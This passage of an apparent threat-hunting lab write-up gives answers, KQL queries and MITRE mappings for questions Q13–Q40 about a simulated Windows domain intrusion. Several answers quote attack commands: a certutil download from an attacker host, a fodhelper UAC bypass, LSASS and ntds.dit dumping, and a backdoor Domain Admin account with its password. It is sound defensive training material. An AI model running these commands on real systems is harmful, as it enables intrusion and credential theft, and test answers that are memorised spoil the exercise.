### 🚩 Q13: Initial Access | Execution Chain

**Objective**\
Reconstruct the full process chain from user action to DLL load.

**Hunt Question**\
What was the full execution chain?

**Answer:** `explorer.exe > rundll32.exe > review.dll`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s in ("1", "4688")
| where Image_s has "rundll32"
| project TimeGenerated, ParentImage_s, Image_s, CommandLine_s, User_s
| sort by TimeGenerated asc
```

**Key Observations**
- `explorer.exe` was the direct parent of `rundll32.exe` with no `cmd.exe` intermediary.
- The user double-clicking something within the mounted ISO triggered `rundll32.exe` directly through the Windows shell.

**Analysis**\
The absence of `cmd.exe` in the chain means the ISO's content (likely a `.lnk` file) targeted `rundll32.exe` directly rather than going through a command prompt. From the user's perspective, opening the mounted drive or double-clicking a file inside it was sufficient.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Execution |
| Technique | T1204.002: User Execution: Malicious File |

---

### 🚩 Q14: Initial Access | Delivery Unpacking

**Objective**\
Identify the extraction step and destination that preceded the DLL load.

**Hunt Question**\
What compression tool and destination path were used to unpack the delivery archive?

**Answer:** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s == "11"
| where TargetFilename_s has ("lmartin")    
| project TimeGenerated, Image_s, TargetFilename_s
| sort by TimeGenerated asc
```

**Key Observations**
- `7zG.exe` (the 7-Zip GUI binary, not the command-line `7z.exe`) extracted an archive into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\`.
- The use of the GUI binary (`7zG.exe`) is consistent with a user who opened the archive through Windows Explorer rather than a command line.
- The folder name `EmberForge_Review` reinforces the social engineering framing.

**Analysis**\
The layered delivery (downloaded archive containing an ISO containing a DLL) adds stages that complicate perimeter detection. Each layer has a different file type. The GUI variant of 7-Zip appearing here rather than the CLI version is a small but useful detail: it confirms user-initiated extraction through the shell, not a scripted extraction step.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1553.005: Subvert Trust Controls: Mark-of-the-Web Bypass |

---

### 🚩 Q15: Execution & C2 | Dropped Payload

**Objective**\
Identify the primary tool dropped for sustained access following the initial DLL execution.

**Hunt Question**\
What was the full path of the primary payload?

**Answer:** `C:\Users\Public\update.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s == "11"
| where TargetFilename_s has_any (".iso", ".dll", ".exe")
    and not(TargetFilename_s startswith @"C:\Windows")
    and not(TargetFilename_s startswith @"C:\Program Files")
| project TimeGenerated, Image_s, TargetFilename_s
| sort by TimeGenerated asc
```

**Key Observations**
- `review.dll` dropped `C:\Users\Public\update.exe` immediately after being loaded.
- `C:\Users\Public\` is writable by all users without elevation and served as the attacker's consistent staging directory throughout the intrusion.
- The name `update.exe` is designed to blend with legitimate software update processes.

**Analysis**\
`C:\Users\Public\` containing both the beacon (`update.exe`), the exfil archive (`gamedev.zip`), and the exfiltration tool (`rclone.exe`) shows the attacker planned a single operational staging area from the start. This also made the `tools` share trivially easy to create, all tools were already in the same world-writable location.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1036.005: Masquerading: Match Legitimate Name or Location |

---

### 🚩 Q16: Execution & C2 | C2 Domain

**Objective**\
Identify the command-and-control domain the primary beacon communicated with.

**Hunt Question**\
What domain did the malware use for C2?

**Answer:** `cdn.cloud-endpoint.net`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s == "22"
| where Image_s has "update.exe"
| extend QueryResults = extract(@"<Data Name=""QueryResults"">([^<]+)</Data>", 1, Raw_s)
| project TimeGenerated, Image_s, QueryName_s, QueryResults
```

**Key Observations**
- `update.exe` queried `cdn.cloud-endpoint.net` shortly after execution.
- This is the same `cloud-endpoint.net` family used in BROKER (C2) and BUYER (payload delivery and ransomware staging).

**Analysis**\
The reappearance of `cloud-endpoint.net` across all three cases is the most significant analytical connection in this hunt. The infrastructure family is now confirmed across BROKER, BUYER, and EmberForge. It warrants a dedicated threat intelligence flag and blocking across any environment where these domains have been observed.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Command and Control |
| Technique | T1071.001: Application Layer Protocol: Web Protocols |

---

### 🚩 Q17: Execution & C2 | Primary C2 IP

**Objective**\
Resolve the C2 domain to its IP address for network-level blocking.

**Hunt Question**\
What IP address did the C2 domain resolve to?

**Answer:** `104.21.30.237`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s == "22"
| where QueryName_s contains "cloud"
| project TimeGenerated, Image_s, QueryName_s, QueryResults_s
| sort by TimeGenerated asc
```

**Key Observations**
- `cdn.cloud-endpoint.net` resolved to `104.21.30.237`.
- This IP also appeared in the BROKER investigation, further confirming shared infrastructure.

**Analysis**\
Both domain and IP must be blocked. Rotating to a new subdomain pointing at the same IP bypasses a domain-only block. Both should be actioned simultaneously at DNS and perimeter firewall.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Command and Control |
| Technique | T1071.001: Application Layer Protocol: Web Protocols |

---

### 🚩 Q18: Execution & C2 | Injection Chain

**Objective**\
Document the first process injection event.

**Hunt Question**\
What was the source and target for the first injection?

**Answer:** `rundll32.exe > notepad.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s == "8"
| project TimeGenerated, SourceImage_s, SourceUser_s, TargetImage_s
| sort by TimeGenerated asc
```

**Key Observations**
- EventCode 8 showed `rundll32.exe` as `SourceImage` and `notepad.exe` as `TargetImage`.

**Analysis**\
Injecting from `rundll32.exe` into `notepad.exe` moves the operator's code into a trusted process that draws no attention in a process list. EventCode 8 is what makes this visible, without Sysmon's `CreateRemoteThread` monitoring this injection is invisible to telemetry that only tracks process creation.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1055: Process Injection |

---

### 🚩 Q19: Privilege Escalation | UAC Bypass Binary

**Objective**\
Identify the Windows binary hijacked for the UAC bypass.

**Hunt Question**\
Which binary was abused for the UAC bypass?

**Answer:** `fodhelper.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 22:45:00))
| where Caller_User_Name_s =~ "lmartin"
| where CommandLine_s has "fodhelper" or CommandLine_s has "ms-settings"
| project TimeGenerated, Caller_User_Name_s,CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- Registry modifications under `HKCU\Software\Classes\ms-settings\shell\open\command` followed `fodhelper.exe` execution.
- `fodhelper.exe` is auto-elevating and reads HKCU for command handlers: HKCU is writable without elevation, so no admin rights are needed to set up the bypass.

**Analysis**\
The `fodhelper.exe` UAC bypass exploits the gap between HKCU writability (user-level) and the auto-elevation of certain Windows binaries. Detection should focus on modifications to `ms-settings` shell command paths, which have no legitimate user-space purpose.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Privilege Escalation |
| Technique | T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control |

---

### 🚩 Q20: Privilege Escalation | Registry Bypass Enabler

**Objective**\
Identify the registry value that activated the UAC bypass.

**Hunt Question**\
What registry value name enabled the fodhelper UAC bypass?

**Answer:** `DelegateExecute`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has "fodhelper" or CommandLine_s has "ms-settings"
| project TimeGenerated, CommandLine_s
```

**Key Observations**
- Two registry modifications occurred in quick succession: one setting the command path, and a second creating `DelegateExecute` with an empty string value.
- `DelegateExecute` is the trigger that causes Windows to delegate execution through the COM handler: without it, `fodhelper.exe` ignores the custom command path.

**Analysis**\
`DelegateExecute` with an empty string under a shell open command path is the exact pattern for this bypass. A detection rule alerting on any `DelegateExecute` write under `HKCU\Software\Classes\` shell command paths catches this technique regardless of which auto-elevating binary is targeted.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Privilege Escalation |
| Technique | T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control |

---

### 🚩 Q21: Privilege Escalation | Stable Injection Chain

**Objective**\
Document the second injection that established SYSTEM-level long-term stability.

**Hunt Question**\
What was the elevated injection chain and target security context?

**Answer:** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s == "8"
| where SourceImage_s contains "update"
| project TimeGenerated, SourceImage_s, TargetImage_s, TargetUser_s
| sort by TimeGenerated asc
```

**Key Observations**
- A second EventCode 8 showed `update.exe` injecting into `spoolsv.exe` with `NT AUTHORITY\SYSTEM` as `TargetUser`.
- `spoolsv.exe` (the Windows Print Spooler) runs persistently as SYSTEM and is a known stable injection target.
- `TargetUser` was only available by parsing `Raw_s`.

**Analysis**\
SYSTEM context provides the highest privilege level on the machine and survives user logoffs. All subsequent discovery and lateral movement commands ran as children of `spoolsv.exe`, which is how that process appears as the post-escalation parent in Q29.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1055: Process Injection |

---

### 🚩 Q22: Credential Access | Credential Dumping Process

**Objective**\
Identify the process that created the LSASS credential dump.

**Hunt Question**\
What process created the LSASS memory dump?

**Answer:** `update.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 22:50:00))
| where EventCode_s == "11"
| where TargetFilename_s endswith ".dmp"
| project TimeGenerated, Image_s, TargetFilename_s
```

**Key Observations**
- EventCode 11 showed `update.exe` writing `lsass.dmp` to disk.
- The attacker used direct syscalls to bypass API monitoring, consistent with no EventCode 10 (`ProcessAccess`) events appearing for LSASS.

**Analysis**\
The hunting path shifted to EventCode 11 precisely because the direct syscall technique eliminates EventCode 10. Looking for `.dmp` file creation events rather than LSASS access events is the bypass-agnostic approach: the dump has to land on disk regardless of the method used.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1003.001: OS Credential Dumping: LSASS Memory |

---

### 🚩 Q23: Credential Access | Dump Location

**Objective**\
Confirm where the LSASS dump was written to disk.

**Hunt Question**\
What was the full path of the credential dump file?

**Answer:** `C:\Windows\System32\lsass.dmp`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 22:50:00))
| where EventCode_s == "11"
| where TargetFilename_s endswith ".dmp"
| project TimeGenerated, Image_s, TargetFilename_s
```

**Key Observations**
- The dump landed at `C:\Windows\System32\lsass.dmp`, naming the file after the process it targets.
- Writing to `C:\Windows\System32\` required SYSTEM-level access, confirming the dump occurred after the `spoolsv.exe` injection.

**Analysis**\
No attempt was made to obscure the dump file name. Speed was prioritised over stealth at this stage, which is consistent with the rest of the operation's pattern of trading OPSEC for tempo.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1003.001: OS Credential Dumping: LSASS Memory |

---

### 🚩 Q24: Discovery | User Enumeration

**Objective**\
Identify the first command in the AD discovery sequence.

**Hunt Question**\
What command was used to enumerate domain users?

**Answer:** `net user /domain`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has ("domain")
| where SubjectUserName_s =~ "lmartin"
| project TimeGenerated, Computer, parent_process_exec_s, SubjectUserName_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `net user /domain` appeared as the first discovery command.

**Analysis**\
`net user /domain` is native and unremarkable in isolation. Context makes it meaningful: run from SYSTEM within seconds of a credential dump, it is clearly part of a structured reconnaissance sequence.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Discovery |
| Technique | T1087.002: Account Discovery: Domain Account |

---

### 🚩 Q25: Discovery | Privilege Enumeration

**Objective**\
Identify the second discovery command targeting high-privilege group membership.

**Hunt Question**\
What command was used to enumerate Domain Admins?

**Answer:** `net group "Domain Admins" /domain`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has ("domain")
| where SubjectUserName_s =~ "lmartin"
| project TimeGenerated, Computer, parent_process_exec_s, SubjectUserName_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `net group "Domain Admins" /domain` appeared immediately after `net user /domain`.
- Identifying Domain Admins membership tells the attacker which hashes from `lsass.dmp` are the highest-value cracking targets.

**Analysis**\
The `net user > net group "Domain Admins"` pair in rapid sequence is a signature post-exploitation pattern. Together from a SYSTEM-context non-admin parent, they are a high-confidence indicator.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Discovery |
| Technique | T1069.002: Permission Groups Discovery: Domain Groups |

---

### 🚩 Q26: Discovery | Infrastructure Mapping

**Objective**\
Identify the command used to locate Domain Controllers.

**Hunt Question**\
What command was used to locate the DC?

**Answer:** `nltest /dclist:emberforge.local`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has_any ("net user", "net group", "nltest", "net share", "netsh")
| project TimeGenerated, Computer, CommandLine_s
```

**Key Observations**
- `nltest /dclist:emberforge.local` completed the three-step discovery sequence, returning `EC2AMAZ-EEU3IA2` (10.1.160.76).
- The attacker had the DC address before beginning lateral movement.

**Analysis**\
`nltest` is less common than `net.exe` in normal admin workflows, making it a higher-signal target. The three-command discovery trio (`net user`, `net group "Domain Admins"`, `nltest /dclist`) within a single short window should trigger a high-confidence alert.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Discovery |
| Technique | T1018: Remote System Discovery |

---

### 🚩 Q27: Lateral Movement | Tool Staging Share

**Objective**\
Identify the network share created to distribute tools for lateral movement.

**Hunt Question**\
What was the full command to create the staging share?

**Answer:** `net share tools=C:\Users\Public /grant:everyone,full`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has_any ("net user", "net group", "nltest", "net share", "netsh")
| project TimeGenerated, Computer, CommandLine_s
```

**Key Observations**
- The share pointed to `C:\Users\Public\`, where `update.exe`, `rclone.exe`, and `gamedev.zip` all lived.
- `/grant:everyone,full` removes any authentication requirement.

**Analysis**\
Creating an unauthenticated share from a user workstation should trigger share monitoring alerts. The path choice was deliberate: all tools were already in `C:\Users\Public\`, making the share creation trivially simple.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Lateral Movement |
| Technique | T1021.002: Remote Services: SMB/Windows Admin Shares |

---

### 🚩 Q28: Lateral Movement | Firewall Manipulation

**Objective**\
Identify the firewall rule added to permit inbound connections.

**Hunt Question**\
What name was given to the firewall rule?

**Answer:** `SMB`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has_any ("net user", "net group", "nltest", "net share", "netsh")
| project TimeGenerated, Computer, CommandLine_s
```

**Key Observations**
- The full command was `netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445`.
- Unlike other cases where firewall rules are named to mimic Windows services, this rule was named plainly `SMB`, functional rather than deceptive.

**Analysis**\
Port 445 inbound is required for the tool share to be reachable from the server. The plain `SMB` name stands out in a firewall audit of a workstation, workstations don't normally accept inbound SMB connections.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1562.004: Impair Defenses: Disable or Modify System Firewall |

---

### 🚩 Q29: Lateral Movement | Post-Escalation Parent

**Objective**\
Confirm which process became the parent of all subsequent attacker commands after SYSTEM injection.

**Hunt Question**\
What process was the parent of the lateral movement commands?

**Answer:** `spoolsv.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where CommandLine_s has_any ("net user", "net group", "nltest", "net share", "netsh")
| project TimeGenerated, Computer, parent_process_name_s, CommandLine_s
```

**Key Observations**
- `ParentImage_s` for the discovery and lateral movement commands all showed `spoolsv.exe`.
- The Print Spooler process has no business spawning `net.exe`, `nltest.exe`, or `netsh.exe` as direct children.

**Analysis**\
`spoolsv.exe` as a parent for administrative commands is a reliable injection indicator. Legitimate print spooler processes use documented service interfaces, they do not spawn command-line utilities. This parent-child relationship is visible in the telemetry even though the injected code itself left no file on disk.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1055: Process Injection |

---

### 🚩 Q30: Lateral Movement | Beacon Distribution

**Objective**\
Document the exact command used to push the beacon to the server via administrative shares.

**Hunt Question**\
What was the full command used?

**Answer:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("C$", "ADMIN$", "IPC$")
    or (CommandLine_s has "copy")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The copy pushed `update.exe` to `C:\Users\Public\` on the server, matching the source directory convention.
- `C$` admin share access required credentials obtained from the LSASS dump.

**Analysis**\
The consistent use of `C:\Users\Public\` on both the workstation and the server as the staging directory simplified the operation: same tool name, same path, same world-writable location on every host.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Lateral Movement |
| Technique | T1021.002: Remote Services: SMB/Windows Admin Shares |

---

### 🚩 Q31: Lateral Movement | LOLBin Tool Staging

**Objective**\
Identify the living-off-the-land binary abused on the server to download additional tools.

**Hunt Question**\
What utility was used and what was the full URL?

**Answer:** `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-16V3AU4"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("certutil", "bitsadmin", "curl", "wget", "Invoke-WebRequest", "iwr")
    and CommandLine_s has_any ("http://", "https://", "ftp://")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `certutil.exe -urlcache -split -f http://sync.cloud-endpoint.net:8080/update.exe` pulled tools from the staging server.
- `sync.cloud-endpoint.net` is the staging subdomain of the same `cloud-endpoint.net` family used for C2 (`cdn.cloud-endpoint.net`).
- Port 8080 is non-standard for HTTPS but consistent with a staging server configured separately from the primary C2 listener.

**Analysis**\
`certutil.exe` as a downloader is one of the most documented LOLBin techniques and yet continues to appear in real intrusions. The detection is straightforward: `certutil.exe` with `-urlcache` or `-split -f` in the command line. The URL cross-confirms the `cloud-endpoint.net` staging infrastructure.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1105: Ingress Tool Transfer |

---

### 🚩 Q32: Lateral Movement | Remote Execution Evidence

**Objective**\
Identify the temporary service name created by psexec-style remote execution on the server.

**Hunt Question**\
What was the temporary service name? (Case-sensitive)

**Answer:** `pGJLIKnC`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-16V3AU4"
| where EventCode_s == "7045"
| where ImagePath_s contains "certutil"
| project TimeGenerated, Computer, ImagePath_s, ServiceName_s, service_path_s
| sort by TimeGenerated asc
```

**Key Observations**
- EventCode 7045 on `EC2AMAZ-16V3AU4` showed a service named `pGJLIKnC`: a random alphanumeric string consistent with Impacket-style psexec tooling.
- The service was short-lived, created to trigger execution and removed once the beacon was running.

**Analysis**\
Random alphanumeric service names are a hallmark of psexec-style lateral movement tools. Legitimate Windows services use descriptive names. A detection rule alerting on EventCode 7045 with service names matching a random mixed-case alphanumeric pattern would catch this technique with minimal false positives.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Lateral Movement |
| Technique | T1021.002: Remote Services: SMB/Windows Admin Shares |

---

### 🚩 Q33: Lateral Movement | First Command on Server

**Objective**\
Confirm the first command executed on the newly-compromised server.

**Hunt Question**\
What was the first attacker command run on the server?

**Answer:** `whoami`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:35:00) .. datetime(2026-02-10 22:45:00))
| where Computer startswith "EC2AMAZ-16V3AU4"
| where EventCode_s == "7045"
| project TimeGenerated, Computer, service_path_s
| sort by TimeGenerated asc
```

**Key Observations**
- `whoami` appeared as the first process execution on the server following the service installation.
- The same pattern was observed on the Domain Controller, confirming it as a consistent operator habit.

**Analysis**\
Operators run `whoami` on every new host because psexec-style execution can land in unpredictable security contexts. The consistent `whoami` habit creates a pivot point: any host showing `whoami` as the first process event after a random-named service installation is part of the same lateral movement chain.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Discovery |
| Technique | T1033: System Owner/User Discovery |

---

### 🚩 Q34: Lateral Movement | Failed Lateral Movement

**Objective**\
Identify the protocol that failed during the initial lateral movement attempt.

**Hunt Question**\
What protocol showed repeated authentication failures from the workstation to the server?

**Answer:** `NTLM`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-16V3AU4"
| where EventCode_s == "4625"
| project TimeGenerated, Computer, name_s, AuthenticationPackageName_s
| sort by TimeGenerated asc
```

**Key Observations**
- Authentication logs on `EC2AMAZ-16V3AU4` showed repeated EventCode 4625 failures from `10.1.173.145` before the `C$` approach succeeded.
- The failure protocol was NTLM, visible in the authentication package field of the raw Security event.

**Analysis**\
NTLM failure telemetry before successful lateral movement documents the attacker's first-choice technique and its failure. The adaptation to admin-share-based distribution is the pattern of operational flexibility seen throughout this intrusion, when one method is blocked, the attacker finds another.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Lateral Movement |
| Technique | T1078.002: Valid Accounts: Domain Accounts |

---

### 🚩 Q35: Domain Compromise | DC Arrival and Credential Extraction

**Objective**\
Confirm the attacker's arrival on the DC and the extraction tool used.

**Hunt Question**\
What was the first command on the DC, and what tool performed the extraction?

**Answer:** `whoami > vssadmin.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("vssadmin", "diskshadow", "wbadmin", "esentutl", "ntdsutil")
    or Image_s has "vssadmin"
| project TimeGenerated, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `whoami` appeared first on the DC, matching the operator habit observed on the server.
- `vssadmin.exe` followed immediately, creating a shadow copy to access `ntds.dit`.
- The speed from DC arrival to extraction suggests a scripted sequence.

**Analysis**\
`vssadmin create shadow /for=C:` is the standard `ntds.dit` extraction method while Active Directory is running. Detection should alert on `vssadmin.exe` shadow copy creation on Domain Controllers, this has near-zero legitimate use in modern environments and is a near-certain indicator of credential theft preparation.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1003.003: OS Credential Dumping: NTDS |

---

### 🚩 Q36: Domain Compromise | Backdoor Account

**Objective**\
Identify the backdoor account created on the DC for persistent access.

**Hunt Question**\
What username was created?

**Answer:** `svc_backup`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("net user", "net group", "net localgroup", "net use")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `net user svc_backup ... /add /domain` appeared in Sysmon telemetry on the DC.
- The `svc_` prefix mimics legitimate Windows service accounts.

**Analysis**\
`svc_backup` appearing without a corresponding software deployment or change management record should trigger an immediate alert. This account must be disabled and its SID purged from all group memberships as the first remediation step.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Persistence |
| Technique | T1136.002: Create Account: Domain Account |

---

### 🚩 Q37: Domain Compromise | Backdoor Credentials

**Objective**\
Recover the plaintext password set for the backdoor account.

**Hunt Question**\
What password was set?

**Answer:** `P@ssw0rd123!`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("net user", "net group", "net localgroup", "net use")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The full command `net user svc_backup P@ssw0rd123! /add /domain` was captured in Sysmon telemetry.

**Analysis**\
This is the second plaintext credential in this investigation (`Summer2024!` in Q07, `P@ssw0rd123!` here). The same pattern (prioritising speed over OPSEC when authentication is required) appears consistently across the operation.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Persistence |
| Technique | T1136.002: Create Account: Domain Account |

---

### 🚩 Q38: Domain Compromise | Privilege Assignment

**Objective**\
Confirm the group to which the backdoor account was added.

**Hunt Question**\
What group was the backdoor account added to?

**Answer:** `Domain Admins`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("net user", "net group", "net localgroup", "net use")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `net group "Domain Admins" svc_backup /add` appeared immediately after account creation.
- Domain Admins membership gives `svc_backup` full administrative access to every system in `emberforge.local`.

**Analysis**\
Creating an account and immediately elevating it to Domain Admins is the persistent backdoor pattern. This account will survive password resets for all other accounts unless explicitly targeted during remediation.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Privilege Escalation |
| Technique | T1098: Account Manipulation |

---

### 🚩 Q39: Domain Compromise | Exposed Credential

**Objective**\
Recover the plaintext credential exposed in the drive mapping command used from the DC to access the workstation tool share.

**Hunt Question**\
What plaintext password was exposed?

**Answer:** `EmberForge2024!`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("net user", "net group", "net localgroup", "net use")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `net use Z: \\10.1.173.145\tools /user:... EmberForge2024!` appeared in DC-side Sysmon telemetry.
- `EmberForge2024!` is styled after the company name: likely a domain administrator or high-privilege shared credential obtained from the LSASS dump or `ntds.dit`.

**Analysis**\
This is the third plaintext credential in this investigation (`Summer2024!`, `P@ssw0rd123!`, `EmberForge2024!`). The consistent pattern of command-line credential exposure across every authentication step reflects an operator who moved fast and let Sysmon record everything. `EmberForge2024!` is likely the most sensitive credential of the three and must be rotated immediately.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1078.002: Valid Accounts: Domain Accounts |

---

### 🚩 Q40: Persistence | Scheduled Task

**Objective**\
Identify the scheduled task created to ensure the payload survives reboots.

**Hunt Question**\
What was the name of the scheduled task?

**Answer:** `WindowsUpdate`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("schtasks", "sc create", "sc config", "AnyDesk", "anydesk", "TeamViewer", "vnc")
    or Image_s has_any ("schtasks", "AnyDesk", "anydesk")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- A scheduled task named `WindowsUpdate` was created to execute `update.exe` on system start.
- The name mimics the legitimate Windows Update mechanism.

**Analysis**\
The detection countermeasure is examining task payloads rather than names: a task pointing to `C:\Users\Public\update.exe` has no connection to Windows Update regardless of what it is called. Scheduled task audits should always check the executable path, not just the task name.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
